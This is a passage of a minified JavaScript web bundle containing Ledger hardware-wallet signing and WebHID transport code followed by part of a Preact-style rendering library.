                    i = i.slice(t, i.length))
                }
                o.push(s);
                const a = [];
                let c;
                const l = o.length;
                if (void 0 !== n)
                    for (let t = 0; t < n.length; t += 1) {
                        const e = Buffer.from(n[t], "hex");
                        o.push(e)
                    }
                if (1 === o.length)
                    a.push(16);
                else {
                    a.push(0);
                    for (let t = 1; t < o.length - 1; t += 1)
                        t >= l ? a.push(160 | t - l) : a.push(128);
                    void 0 !== n && n.length ? a.push(168 | n.length - 1) : a.push(144)
                }
                return E(o, (t, e) => this.transport.send(_, 4, a[e], 0, t).then(t => {
                    c = t
                }
                )).then( () => c.slice(0, 65).toString("hex"), t => {
                    throw (t => (t && t.statusCode,
                    t))(t)
                }
                )
            }
            signTransactionHash(t, e) {
                const n = I(t);
                let r = Buffer.alloc(1 + 4 * n.length);
                return r[0] = n.length,
                n.forEach( (t, e) => {
                    r.writeUInt32BE(t, 1 + 4 * e)
                }
                ),
                r = Buffer.concat([r, Buffer.from(e, "hex")]),
                this.transport.send(_, 5, 0, 0, r).then(t => t.slice(0, 65).toString("hex"))
            }
            getAppConfiguration() {
                return this.transport.send(_, 6, 0, 0).then(t => {
                    const e = (8 & t[0]) > 0;
                    let n = (4 & t[0]) > 0
                      , r = (2 & t[0]) > 0
                      , i = (1 & t[0]) > 0;
                    return 0 === t[1] && 1 === t[2] && t[3] < 2 && (i = !0,
                    r = !1),
                    0 === t[1] && 1 === t[2] && t[3] < 5 && (n = !1),
                    {
                        version: `${t[1]}.${t[2]}.${t[3]}`,
                        versionN: 1e4 * t[1] + 100 * t[2] + t[3],
                        allowData: i,
                        allowContract: r,
                        truncateAddress: n,
                        signByHash: e
                    }
                }
                )
            }
            signPersonalMessage(t, e) {
                const n = I(t)
                  , r = Buffer.from(e, "hex");
                let i = 0;
                const o = []
                  , s = r.length.toString(16)
                  , a = "00000000".substr(s.length) + s
                  , c = Buffer.concat([Buffer.from(a, "hex"), r]);
                for (; i < c.length; ) {
                    const t = 0 === i ? 249 - 4 * n.length : 250
                      , e = i + t > c.length ? c.length - i : t
                      , r = Buffer.alloc(0 === i ? 1 + 4 * n.length + e : e);
                    0 === i ? (r[0] = n.length,
                    n.forEach( (t, e) => {
                        r.writeUInt32BE(t, 1 + 4 * e)
                    }
                    ),
                    c.copy(r, 1 + 4 * n.length, i, i + e)) : c.copy(r, 0, i, i + e),
                    o.push(r),
                    i += e
                }
                let l;
                return E(o, (t, e) => this.transport.send(_, 8, 0 === e ? 0 : 128, 0, t).then(t => {
                    l = t
                }
                )).then( () => l.slice(0, 65).toString("hex"))
            }
            signTIP712HashedMessage(t, e, n) {
                return ( (t, e, n, r) => {
                    const i = b(n)
                      , o = b(r)
                      , s = I(e)
                      , a = Buffer.alloc(1 + 4 * s.length + 32 + 32, 0);
                    let c = 0;
                    return a[0] = s.length,
                    s.forEach( (t, e) => {
                        a.writeUint32BE(t, 1 + 4 * e)
                    }
                    ),
                    c = 1 + 4 * s.length,
                    i.copy(a, c),
                    c += 32,
                    o.copy(a, c),
                    t.send(224, 12, 0, 0, a).then(t => t.slice(0, 65).toString("hex"))
                }
                )(this.transport, t, e, n)
            }
            getECDHPairKey(t, e) {
                const n = I(t)
                  , r = Buffer.from(e, "hex")
                  , i = Buffer.alloc(1 + 4 * n.length + r.length);
                return i[0] = n.length,
                n.forEach( (t, e) => {
                    i.writeUInt32BE(t, 1 + 4 * e)
                }
                ),
                r.copy(i, 1 + 4 * n.length, 0, r.length),
                this.transport.send(_, 10, 0, 1, i).then(t => t.slice(0, 65).toString("hex"))
            }
        }
        var x = i(7007)
          , D = i.n(x)
          , k = i(4450)
          , L = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        }
          , S = function(t, e) {
            var n, r, i, o, s = {
                label: 0,
                sent: function() {
                    if (1 & i[0])
                        throw i[1];
                    return i[1]
                },
                trys: [],
                ops: []
            };
            return o = {
                next: a(0),
                throw: a(1),
                return: a(2)
            },
            "function" == typeof Symbol && (o[Symbol.iterator] = function() {
                return this
            }
            ),
            o;
            function a(o) {
                return function(a) {
                    return function(o) {
                        if (n)
                            throw new TypeError("Generator is already executing.");
                        for (; s; )
                            try {
                                if (n = 1,
                                r && (i = 2 & o[0] ? r.return : o[0] ? r.throw || ((i = r.return) && i.call(r),
                                0) : r.next) && !(i = i.call(r, o[1])).done)
                                    return i;
                                switch (r = 0,
                                i && (o = [2 & o[0], i.value]),
                                o[0]) {
                                case 0:
                                case 1:
                                    i = o;
                                    break;
                                case 4:
                                    return s.label++,
                                    {
                                        value: o[1],
                                        done: !1
                                    };
                                case 5:
                                    s.label++,
                                    r = o[1],
                                    o = [0];
                                    continue;
                                case 7:
                                    o = s.ops.pop(),
                                    s.trys.pop();
                                    continue;
                                default:
                                    if (!((i = (i = s.trys).length > 0 && i[i.length - 1]) || 6 !== o[0] && 2 !== o[0])) {
                                        s = 0;
                                        continue
                                    }
                                    if (3 === o[0] && (!i || o[1] > i[0] && o[1] < i[3])) {
                                        s.label = o[1];
                                        break
                                    }
                                    if (6 === o[0] && s.label < i[1]) {
                                        s.label = i[1],
                                        i = o;
                                        break
                                    }
                                    if (i && s.label < i[2]) {
                                        s.label = i[2],
                                        s.ops.push(o);
                                        break
                                    }
                                    i[2] && s.ops.pop(),
                                    s.trys.pop();
                                    continue
                                }
                                o = e.call(t, s)
                            } catch (t) {
                                o = [6, t],
                                r = 0
                            } finally {
                                n = i = 0
                            }
                        if (5 & o[0])
                            throw o[1];
                        return {
                            value: o[0] ? o[1] : void 0,
                            done: !0
                        }
                    }([o, a])
                }
            }
        }
          , C = function() {
            function t() {
                var t = this;
                this.exchangeTimeout = 3e4,
                this.unresponsiveTimeout = 15e3,
                this.deviceModel = null,
                this._events = new (D()),
                this.send = function(e, n, r, i, o, s) {
                    return void 0 === o && (o = Buffer.alloc(0)),
                    void 0 === s && (s = [k.StatusCodes.OK]),
                    L(t, void 0, void 0, function() {
                        var t, a;
                        return S(this, function(c) {
                            switch (c.label) {
                            case 0:
                                if (o.length >= 256)
                                    throw new k.TransportError("data.length exceed 256 bytes limit. Got: " + o.length,"DataLengthTooBig");
                                return [4, this.exchange(Buffer.concat([Buffer.from([e, n, r, i]), Buffer.from([o.length]), o]))];
                            case 1:
                                if (t = c.sent(),
                                a = t.readUInt16BE(t.length - 2),
                                !s.some(function(t) {
                                    return t === a
                                }))
                                    throw new k.TransportStatusError(a);
                                return [2, t]
                            }
                        })
                    })
                }
                ,
                this.exchangeAtomicImpl = function(e) {
                    return L(t, void 0, void 0, function() {
                        var t, n, r, i, o, s = this;
                        return S(this, function(a) {
                            switch (a.label) {
                            case 0:
                                if (this.exchangeBusyPromise)
                                    throw new k.TransportRaceCondition("An action was already pending on the Ledger device. Please deny or reconnect.");
                                n = new Promise(function(e) {
                                    t = e
                                }
                                ),
                                this.exchangeBusyPromise = n,
                                r = !1,
                                i = setTimeout(function() {
                                    r = !0,
                                    s.emit("unresponsive")
                                }, this.unresponsiveTimeout),
                                a.label = 1;
                            case 1:
                                return a.trys.push([1, , 3, 4]),
                                [4, e()];
                            case 2:
                                return o = a.sent(),
                                r && this.emit("responsive"),
                                [2, o];
                            case 3:
                                return clearTimeout(i),
                                t && t(),
                                this.exchangeBusyPromise = null,
                                [7];
                            case 4:
                                return [2]
                            }
                        })
                    })
                }
                ,
                this._appAPIlock = null
            }
            return t.prototype.exchange = function(t) {
                throw new Error("exchange not implemented")
            }
            ,
            t.prototype.setScrambleKey = function(t) {}
            ,
            t.prototype.close = function() {
                return Promise.resolve()
            }
            ,
            t.prototype.on = function(t, e) {
                this._events.on(t, e)
            }
            ,
            t.prototype.off = function(t, e) {
                this._events.removeListener(t, e)
            }
            ,
            t.prototype.emit = function(t) {
                for (var e, n = [], r = 1; r < arguments.length; r++)
                    n[r - 1] = arguments[r];
                (e = this._events).emit.apply(e, function(t, e, n) {
                    if (n || 2 === arguments.length)
                        for (var r, i = 0, o = e.length; i < o; i++)
                            !r && i in e || (r || (r = Array.prototype.slice.call(e, 0, i)),
                            r[i] = e[i]);
                    return t.concat(r || Array.prototype.slice.call(e))
                }([t], function(t, e) {
                    var n = "function" == typeof Symbol && t[Symbol.iterator];
                    if (!n)
                        return t;
                    var r, i, o = n.call(t), s = [];
                    try {
                        for (; (void 0 === e || e-- > 0) && !(r = o.next()).done; )
                            s.push(r.value)
                    } catch (t) {
                        i = {
                            error: t
                        }
                    } finally {
                        try {
                            r && !r.done && (n = o.return) && n.call(o)
                        } finally {
                            if (i)
                                throw i.error
                        }
                    }
                    return s
                }(n), !1))
            }
            ,
            t.prototype.setDebugMode = function() {
                console.warn("setDebugMode is deprecated. use @ledgerhq/logs instead. No logs are emitted in this anymore.")
            }
            ,
            t.prototype.setExchangeTimeout = function(t) {
                this.exchangeTimeout = t
            }
            ,
            t.prototype.setExchangeUnresponsiveTimeout = function(t) {
                this.unresponsiveTimeout = t
            }
            ,
            t.create = function(t, e) {
                var n = this;
                return void 0 === t && (t = 3e3),
                new Promise(function(r, i) {
                    var o = !1
                      , s = n.listen({
                        next: function(e) {
                            o = !0,
                            s && s.unsubscribe(),
                            a && clearTimeout(a),
                            n.open(e.descriptor, t).then(r, i)
                        },
                        error: function(t) {
                            a && clearTimeout(a),
                            i(t)
                        },
                        complete: function() {
                            a && clearTimeout(a),
                            o || i(new k.TransportError(n.ErrorMessage_NoDeviceFound,"NoDeviceFound"))
                        }
                    })
                      , a = e ? setTimeout(function() {
                        s.unsubscribe(),
                        i(new k.TransportError(n.ErrorMessage_ListenTimeout,"ListenTimeout"))
                    }, e) : null
                }
                )
            }
            ,
            t.prototype.decorateAppAPIMethods = function(t, e, n) {
                var r, i;
                try {
                    for (var o = function(t) {
                        var e = "function" == typeof Symbol && Symbol.iterator
                          , n = e && t[e]
                          , r = 0;
                        if (n)
                            return n.call(t);
                        if (t && "number" == typeof t.length)
                            return {
                                next: function() {
                                    return t && r >= t.length && (t = void 0),
                                    {
                                        value: t && t[r++],
                                        done: !t
                                    }
                                }
                            };
                        throw new TypeError(e ? "Object is not iterable." : "Symbol.iterator is not defined.")
                    }(e), s = o.next(); !s.done; s = o.next()) {
                        var a = s.value;
                        t[a] = this.decorateAppAPIMethod(a, t[a], t, n)
                    }
                } catch (t) {
                    r = {
                        error: t
                    }
                } finally {
                    try {
                        s && !s.done && (i = o.return) && i.call(o)
                    } finally {
                        if (r)
                            throw r.error
                    }
                }
            }
            ,
            t.prototype.decorateAppAPIMethod = function(t, e, n, r) {
                var i = this;
                return function() {
                    for (var o = [], s = 0; s < arguments.length; s++)
                        o[s] = arguments[s];
                    return L(i, void 0, void 0, function() {
                        var i;
                        return S(this, function(s) {
                            switch (s.label) {
                            case 0:
                                if (i = this._appAPIlock)
                                    return [2, Promise.reject(new k.TransportError("Ledger Device is busy (lock " + i + ")","TransportLocked"))];
                                s.label = 1;
                            case 1:
                                return s.trys.push([1, , 3, 4]),
                                this._appAPIlock = t,
                                this.setScrambleKey(r),
                                [4, e.apply(n, o)];
                            case 2:
                                return [2, s.sent()];
                            case 3:
                                return this._appAPIlock = null,
                                [7];
                            case 4:
                                return [2]
                            }
                        })
                    })
                }
            }
            ,
            t.ErrorMessage_ListenTimeout = "No Ledger device found (timeout)",
            t.ErrorMessage_NoDeviceFound = "No Ledger device found",
            t
        }();
        const j = C;
        var O, U, W = i(3207), z = i(9589), R = i.n(z), P = function() {
            return P = Object.assign || function(t) {
                for (var e, n = 1, r = arguments.length; n < r; n++)
                    for (var i in e = arguments[n])
                        Object.prototype.hasOwnProperty.call(e, i) && (t[i] = e[i]);
                return t
            }
            ,
            P.apply(this, arguments)
        };
        !function(t) {
            t.blue = "blue",
            t.nanoS = "nanoS",
            t.nanoSP = "nanoSP",
            t.nanoX = "nanoX",
            t.nanoFTS = "nanoFTS"
        }(U || (U = {}));
        var F = ((O = {})[U.blue] = {
            id: U.blue,
            productName: "Ledger Blue",
            productIdMM: 0,
            legacyUsbProductId: 0,
            usbOnly: !0,
            memorySize: 491520,
            masks: [822083584, 822149120],
            getBlockSize: function(t) {
                return 4096
            }
        },
        O[U.nanoS] = {
            id: U.nanoS,
            productName: "Ledger Nano S",
            productIdMM: 16,
            legacyUsbProductId: 1,
            usbOnly: !0,
            memorySize: 327680,
            masks: [823132160],
            getBlockSize: function(t) {
                var e;
                return R().lt(null !== (e = R().coerce(t)) && void 0 !== e ? e : "", "2.0.0") ? 4096 : 2048
            }
        },
        O[U.nanoSP] = {
            id: U.nanoSP,
            productName: "Ledger Nano S Plus",
            productIdMM: 80,
            legacyUsbProductId: 5,
            usbOnly: !0,
            memorySize: 1572864,
            masks: [856686592],
            getBlockSize: function(t) {
                return 32
            }
        },
        O[U.nanoX] = {
            id: U.nanoX,
            productName: "Ledger Nano X",
            productIdMM: 64,
            legacyUsbProductId: 4,
            usbOnly: !1,
            memorySize: 2097152,
            masks: [855638016],
            getBlockSize: function(t) {
                return 4096
            },
            bluetoothSpec: [{
                serviceUuid: "13d63400-2c97-0004-0000-4c6564676572",
                notifyUuid: "13d63400-2c97-0004-0001-4c6564676572",
                writeUuid: "13d63400-2c97-0004-0002-4c6564676572",
                writeCmdUuid: "13d63400-2c97-0004-0003-4c6564676572"
            }]
        },
        O[U.nanoFTS] = {
            id: U.nanoFTS,
            productName: "Ledger Nano FTS",
            productIdMM: 96,
            legacyUsbProductId: 6,
            usbOnly: !1,
            memorySize: 2097152,
            masks: [857735168],
            getBlockSize: function(t) {
                return 4096
            },
            bluetoothSpec: [{
                serviceUuid: "13d63400-2c97-6004-0000-4c6564676572",
                notifyUuid: "13d63400-2c97-6004-0001-4c6564676572",
                writeUuid: "13d63400-2c97-6004-0002-4c6564676572",
                writeCmdUuid: "13d63400-2c97-6004-0003-4c6564676572"
            }]
        },
        O)
          , B = (U.blue,
        U.nanoS,
        U.nanoSP,
        U.nanoX,
        U.nanoFTS,
        Object.values(F))
          , V = function(t) {
            var e = B.find(function(e) {
                return e.legacyUsbProductId === t
            });
            if (e)
                return e;
            var n = t >> 8
              , r = B.find(function(t) {
                return t.productIdMM === n
            });
            return r
        }
          , Q = []
          , Y = {};
        for (var G in F) {
            var Z = F[G]
              , H = Z.bluetoothSpec;
            if (H)
                for (var J = 0; J < H.length; J++) {
                    var X = H[J];
                    Q.push(X.serviceUuid),
                    Y[X.serviceUuid] = Y[X.serviceUuid.replace(/-/g, "")] = P({
                        deviceModel: Z
                    }, X)
                }
        }
        let q = 0;
        const K = []
          , $ = (t, e, n) => {
            const r = {
                type: t,
                id: String(++q),
                date: new Date
            };
            e && (r.message = e),
            n && (r.data = n),
            function(t) {
                for (let e = 0; e < K.length; e++)
                    try {
                        K[e](t)
                    } catch (t) {
                        console.error(t)
                    }
            }(r)
        }
        ;
        "undefined" != typeof window && (window.__ledgerLogsListen = t => (K.push(t),
        () => {
            const e = K.indexOf(t);
            -1 !== e && (K[e] = K[K.length - 1],
            K.pop())
        }
        ));
        var tt, et = (tt = function(t, e) {
            return tt = Object.setPrototypeOf || {
                __proto__: []
            }instanceof Array && function(t, e) {
                t.__proto__ = e
            }
            || function(t, e) {
                for (var n in e)
                    Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n])
            }
            ,
            tt(t, e)
        }
        ,
        function(t, e) {
            if ("function" != typeof e && null !== e)
                throw new TypeError("Class extends value " + String(e) + " is not a constructor or null");
            function n() {
                this.constructor = t
            }
            tt(t, e),
            t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype,
            new n)
        }
        ), nt = function(t, e, n, r) {
            return new (n || (n = Promise))(function(i, o) {
                function s(t) {
                    try {
                        c(r.next(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function a(t) {
                    try {
                        c(r.throw(t))
                    } catch (t) {
                        o(t)
                    }
                }
                function c(t) {
                    var e;
                    t.done ? i(t.value) : (e = t.value,
                    e instanceof n ? e : new n(function(t) {
                        t(e)
                    }
                    )).then(s, a)
                }
                c((r = r.apply(t, e || [])).next())
            }
            )
        }, rt = function(t, e) {
            var n, r, i, o, s = {
                label: 0,
                sent: function() {
                    if (1 & i[0])
                        throw i[1];
                    return i[1]
                },
                trys: [],
                ops: []
            };
            return o = {
                next: a(0),
                throw: a(1),
                return: a(2)
            },
            "function" == typeof Symbol && (o[Symbol.iterator] = function() {
                return this
            }
            ),
            o;
            function a(o) {
                return function(a) {
                    return function(o) {
                        if (n)
                            throw new TypeError("Generator is already executing.");
                        for (; s; )
                            try {
                                if (n = 1,
                                r && (i = 2 & o[0] ? r.return : o[0] ? r.throw || ((i = r.return) && i.call(r),
                                0) : r.next) && !(i = i.call(r, o[1])).done)
                                    return i;
                                switch (r = 0,
                                i && (o = [2 & o[0], i.value]),
                                o[0]) {
                                case 0:
                                case 1:
                                    i = o;
                                    break;
                                case 4:
                                    return s.label++,
                                    {
                                        value: o[1],
                                        done: !1
                                    };
                                case 5:
                                    s.label++,
                                    r = o[1],
                                    o = [0];
                                    continue;
                                case 7:
                                    o = s.ops.pop(),
                                    s.trys.pop();
                                    continue;
                                default:
                                    if (!((i = (i = s.trys).length > 0 && i[i.length - 1]) || 6 !== o[0] && 2 !== o[0])) {
                                        s = 0;
                                        continue
                                    }
                                    if (3 === o[0] && (!i || o[1] > i[0] && o[1] < i[3])) {
                                        s.label = o[1];
                                        break
                                    }
                                    if (6 === o[0] && s.label < i[1]) {
                                        s.label = i[1],
                                        i = o;
                                        break
                                    }
                                    if (i && s.label < i[2]) {
                                        s.label = i[2],
                                        s.ops.push(o);
                                        break
                                    }
                                    i[2] && s.ops.pop(),
                                    s.trys.pop();
                                    continue
                                }
                                o = e.call(t, s)
                            } catch (t) {
                                o = [6, t],
                                r = 0
                            } finally {
                                n = i = 0
                            }
                        if (5 & o[0])
                            throw o[1];
                        return {
                            value: o[0] ? o[1] : void 0,
                            done: !0
                        }
                    }([o, a])
                }
            }
        }, it = function(t, e) {
            var n = "function" == typeof Symbol && t[Symbol.iterator];
            if (!n)
                return t;
            var r, i, o = n.call(t), s = [];
            try {
                for (; (void 0 === e || e-- > 0) && !(r = o.next()).done; )
                    s.push(r.value)
            } catch (t) {
                i = {
                    error: t
                }
            } finally {
                try {
                    r && !r.done && (n = o.return) && n.call(o)
                } finally {
                    if (i)
                        throw i.error
                }
            }
            return s
        }, ot = [{
            vendorId: 11415
        }], st = function() {
            return Promise.resolve(!(!window.navigator || !window.navigator.hid))
        }, at = function() {
            var t = navigator.hid;
            if (!t)
                throw new k.TransportError("navigator.hid is not supported","HIDNotSupported");
            return t
        };
        function ct() {
            return nt(this, void 0, void 0, function() {
                var t;
                return rt(this, function(e) {
                    switch (e.label) {
                    case 0:
                        return [4, at().requestDevice({
                            filters: ot
                        })];
                    case 1:
                        return t = e.sent(),
                        Array.isArray(t) ? [2, t] : [2, [t]]
                    }
                })
            })
        }
        function lt() {
            return nt(this, void 0, void 0, function() {
                return rt(this, function(t) {
                    switch (t.label) {
                    case 0:
                        return [4, at().getDevices()];
                    case 1:
                        return [2, t.sent().filter(function(t) {
                            return 11415 === t.vendorId
                        })]
                    }
                })
            })
        }
        var dt = function(t) {
            function e(e) {
                var n = t.call(this) || this;
                return n.channel = Math.floor(65535 * Math.random()),
                n.packetSize = 64,
                n.inputs = [],
                n.read = function() {
                    return n.inputs.length ? Promise.resolve(n.inputs.shift()) : new Promise(function(t) {
                        n.inputCallback = t
                    }
                    )
                }
                ,
                n.onInputReport = function(t) {
                    var e = Buffer.from(t.data.buffer);
                    n.inputCallback ? (n.inputCallback(e),
                    n.inputCallback = null) : n.inputs.push(e)
                }
                ,
                n._disconnectEmitted = !1,
                n._emitDisconnect = function(t) {
                    n._disconnectEmitted || (n._disconnectEmitted = !0,
                    n.emit("disconnect", t))
                }
                ,
                n.exchange = function(t) {
                    return nt(n, void 0, void 0, function() {
                        var e = this;
                        return rt(this, function(n) {
                            switch (n.label) {
                            case 0:
                                return [4, this.exchangeAtomicImpl(function() {
                                    return nt(e, void 0, void 0, function() {
                                        var e, n, r, i, o, s, a, c, l;
                                        return rt(this, function(d) {
                                            switch (d.label) {
                                            case 0:
                                                n = (e = this).channel,
                                                r = e.packetSize,
                                                $("apdu", "=> " + t.toString("hex")),
                                                i = (0,
                                                W.A)(n, r),
                                                o = i.makeBlocks(t),
                                                s = 0,
                                                d.label = 1;
                                            case 1:
                                                return s < o.length ? [4, this.device.sendReport(0, o[s])] : [3, 4];
                                            case 2:
                                                d.sent(),
                                                d.label = 3;
                                            case 3:
                                                return s++,
                                                [3, 1];
                                            case 4:
                                                return (a = i.getReducedResult(c)) ? [3, 6] : [4, this.read()];
                                            case 5:
                                                return l = d.sent(),
                                                c = i.reduceResponse(c, l),
                                                [3, 4];
                                            case 6:
                                                return $("apdu", "<= " + a.toString("hex")),
                                                [2, a]
                                            }
                                        })
                                    })
                                }).catch(function(t) {
                                    if (t && t.message && t.message.includes("write"))
                                        throw e._emitDisconnect(t),
                                        new k.DisconnectedDeviceDuringOperation(t.message);
                                    throw t
                                })];
                            case 1:
                                return [2, n.sent()]
                            }
                        })
                    })
                }
                ,
                n.device = e,
                n.deviceModel = "number" == typeof e.productId ? V(e.productId) : void 0,
                e.addEventListener("inputreport", n.onInputReport),
                n
            }
            return et(e, t),
            e.request = function() {
                return nt(this, void 0, void 0, function() {
                    var t, n;
                    return rt(this, function(r) {
                        switch (r.label) {
                        case 0:
                            return [4, ct()];
                        case 1:
                            return t = it.apply(void 0, [r.sent(), 1]),
                            n = t[0],
                            [2, e.open(n)]
                        }
                    })
                })
            }
            ,
            e.openConnected = function() {
                return nt(this, void 0, void 0, function() {
                    var t;
                    return rt(this, function(n) {
                        switch (n.label) {
                        case 0:
                            return [4, lt()];
                        case 1:
                            return 0 === (t = n.sent()).length ? [2, null] : [2, e.open(t[0])]
                        }
                    })
                })
            }
            ,
            e.open = function(t) {
                return nt(this, void 0, void 0, function() {
                    var n, r;
                    return rt(this, function(i) {
                        switch (i.label) {
                        case 0:
                            return [4, t.open()];
                        case 1:
                            return i.sent(),
                            n = new e(t),
                            r = function(e) {
                                t === e.device && (at().removeEventListener("disconnect", r),
                                n._emitDisconnect(new k.DisconnectedDevice))
                            }
                            ,
                            at().addEventListener("disconnect", r),
                            [2, n]
                        }
                    })
                })
            }
            ,
            e.prototype.close = function() {
                return nt(this, void 0, void 0, function() {
                    return rt(this, function(t) {
                        switch (t.label) {
                        case 0:
                            return [4, this.exchangeBusyPromise];
                        case 1:
                            return t.sent(),
                            this.device.removeEventListener("inputreport", this.onInputReport),
                            [4, this.device.close()];
                        case 2:
                            return t.sent(),
                            [2]
                        }
                    })
                })
            }
            ,
            e.prototype.setScrambleKey = function() {}
            ,
            e.isSupported = st,
            e.list = lt,
            e.listen = function(t) {
                var e = !1;
                return function() {
                    return nt(this, void 0, void 0, function() {
                        var t;
                        return rt(this, function(e) {
                            switch (e.label) {
                            case 0:
                                return [4, lt()];
                            case 1:
                                return (t = e.sent()).length > 0 ? [2, t[0]] : [4, ct()];
                            case 2:
                                return [2, e.sent()[0]]
                            }
                        })
                    })
                }().then(function(n) {
                    if (n) {
                        if (!e) {
                            var r = "number" == typeof n.productId ? V(n.productId) : void 0;
                            t.next({
                                type: "add",
                                descriptor: n,
                                deviceModel: r
                            }),
                            t.complete()
                        }
                    } else
                        t.error(new k.TransportOpenUserCancelled("Access denied to use Ledger device"))
                }, function(e) {
                    t.error(new k.TransportOpenUserCancelled(e.message))
                }),
                {
                    unsubscribe: function() {
                        e = !0
                    }
                }
            }
            ,
            e
        }(j);
        const ht = dt;
        var ut, ft, pt, gt, wt, mt, yt, vt, Mt, Nt, It, Et = {}, At = [], bt = /acit|ex(?:s|g|n|p|$)|rph|grid|ows|mnc|ntw|ine[ch]|zoo|^ord|itera/i, _t = Array.isArray;
        function Tt(t, e) {
            for (var n in e)
                t[n] = e[n];
            return t
        }
        function xt(t) {
            t && t.parentNode && t.parentNode.removeChild(t)
        }
        function Dt(t, e, n) {
            var r, i, o, s = {};
            for (o in e)
                "key" == o ? r = e[o] : "ref" == o ? i = e[o] : s[o] = e[o];
            if (arguments.length > 2 && (s.children = arguments.length > 3 ? ut.call(arguments, 2) : n),
            "function" == typeof t && null != t.defaultProps)
                for (o in t.defaultProps)
                    void 0 === s[o] && (s[o] = t.defaultProps[o]);
            return kt(t, s, r, i, null)
        }
        function kt(t, e, n, r, i) {
            var o = {
                type: t,
                props: e,
                key: n,
                ref: r,
                __k: null,
                __: null,
                __b: 0,
                __e: null,
                __c: null,
                constructor: void 0,
                __v: null == i ? ++pt : i,
                __i: -1,
                __u: 0
            };
            return null == i && null != ft.vnode && ft.vnode(o),
            o
        }
        function Lt(t) {
            return t.children
        }
        function St(t, e) {
            this.props = t,
            this.context = e
        }
        function Ct(t, e) {
            if (null == e)
                return t.__ ? Ct(t.__, t.__i + 1) : null;
            for (var n; e < t.__k.length; e++)
                if (null != (n = t.__k[e]) && null != n.__e)
                    return n.__e;
            return "function" == typeof t.type ? Ct(t) : null
        }
        function jt(t) {
            var e, n;
            if (null != (t = t.__) && null != t.__c) {
                for (t.__e = t.__c.base = null,
                e = 0; e < t.__k.length; e++)
                    if (null != (n = t.__k[e]) && null != n.__e) {
                        t.__e = t.__c.base = n.__e;
                        break
                    }
                return jt(t)
            }
        }
        function Ot(t) {
            (!t.__d && (t.__d = !0) && gt.push(t) && !Ut.__r++ || wt != ft.debounceRendering) && ((wt = ft.debounceRendering) || mt)(Ut)
        }
        function Ut() {
            for (var t, e, n, r, i, o, s, a = 1; gt.length; )
                gt.length > a && gt.sort(yt),
                t = gt.shift(),
                a = gt.length,
                t.__d && (n = void 0,
                r = void 0,
                i = (r = (e = t).__v).__e,
                o = [],
                s = [],
                e.__P && ((n = Tt({}, r)).__v = r.__v + 1,
                ft.vnode && ft.vnode(n),
                Yt(e.__P, n, r, e.__n, e.__P.namespaceURI, 32 & r.__u ? [i] : null, o, null == i ? Ct(r) : i, !!(32 & r.__u), s),
                n.__v = r.__v,
                n.__.__k[n.__i] = n,
                Zt(o, n, s),
                r.__e = r.__ = null,
                n.__e != i && jt(n)));
            Ut.__r = 0
        }
        function Wt(t, e, n, r, i, o, s, a, c, l, d) {
            var h, u, f, p, g, w, m, y = r && r.__k || At, v = e.length;
            for (c = zt(n, e, y, c, v),
            h = 0; h < v; h++)
                null != (f = n.__k[h]) && (u = -1 == f.__i ? Et : y[f.__i] || Et,
                f.__i = h,
                w = Yt(t, f, u, i, o, s, a, c, l, d),
                p = f.__e,
                f.ref && u.ref != f.ref && (u.ref && Xt(u.ref, null, f),
                d.push(f.ref, f.__c || p, f)),
                null == g && null != p && (g = p),
                (m = !!(4 & f.__u)) || u.__k === f.__k ? c = Rt(f, c, t, m) : "function" == typeof f.type && void 0 !== w ? c = w : p && (c = p.nextSibling),
                f.__u &= -7);
            return n.__e = g,
            c
        }
        function zt(t, e, n, r, i) {
            var o, s, a, c, l, d = n.length, h = d, u = 0;
            for (t.__k = new Array(i),
            o = 0; o < i; o++)
                null != (s = e[o]) && "boolean" != typeof s && "function" != typeof s ? ("string" == typeof s || "number" == typeof s || "bigint" == typeof s || s.constructor == String ? s = t.__k[o] = kt(null, s, null, null, null) : _t(s) ? s = t.__k[o] = kt(Lt, {
                    children: s
                }, null, null, null) : void 0 === s.constructor && s.__b > 0 ? s = t.__k[o] = kt(s.type, s.props, s.key, s.ref ? s.ref : null, s.__v) : t.__k[o] = s,
                c = o + u,
                s.__ = t,
                s.__b = t.__b + 1,
                a = null,
                -1 != (l = s.__i = Ft(s, n, c, h)) && (h--,
                (a = n[l]) && (a.__u |= 2)),
                null == a || null == a.__v ? (-1 == l && (i > d ? u-- : i < d && u++),
                "function" != typeof s.type && (s.__u |= 4)) : l != c && (l == c - 1 ? u-- : l == c + 1 ? u++ : (l > c ? u-- : u++,
                s.__u |= 4))) : t.__k[o] = null;
            if (h)
                for (o = 0; o < d; o++)
                    null != (a = n[o]) && !(2 & a.__u) && (a.__e == r && (r = Ct(a)),
                    qt(a, a));
            return r
        }
        function Rt(t, e, n, r) {
            var i, o;
            if ("function" == typeof t.type) {
                for (i = t.__k,
                o = 0; i && o < i.length; o++)
                    i[o] && (i[o].__ = t,
                    e = Rt(i[o], e, n, r));
                return e
            }
            t.__e != e && (r && (e && t.type && !e.parentNode && (e = Ct(t)),
            n.insertBefore(t.__e, e || null)),
            e = t.__e);
            do {
                e = e && e.nextSibling
            } while (null != e && 8 == e.nodeType);
            return e
        }
        function Pt(t, e) {
            return e = e || [],
            null == t || "boolean" == typeof t || (_t(t) ? t.some(function(t) {
                Pt(t, e)
            }) : e.push(t)),
            e
        }
        function Ft(t, e, n, r) {
            var i, o, s, a = t.key, c = t.type, l = e[n], d = null != l && !(2 & l.__u);
            if (null === l && null == a || d && a == l.key && c == l.type)
                return n;
            if (r > (d ? 1 : 0))
                for (i = n - 1,
                o = n + 1; i >= 0 || o < e.length; )
                    if (null != (l = e[s = i >= 0 ? i-- : o++]) && !(2 & l.__u) && a == l.key && c == l.type)
                        return s;
            return -1
        }
        function Bt(t, e, n) {
            "-" == e[0] ? t.setProperty(e, null == n ? "" : n) : t[e] = null == n ? "" : "number" != typeof n || bt.test(e) ? n : n + "px"
        }
        function Vt(t, e, n, r, i) {
            var o, s;
            t: if ("style" == e)
                if ("string" == typeof n)
                    t.style.cssText = n;
                else {
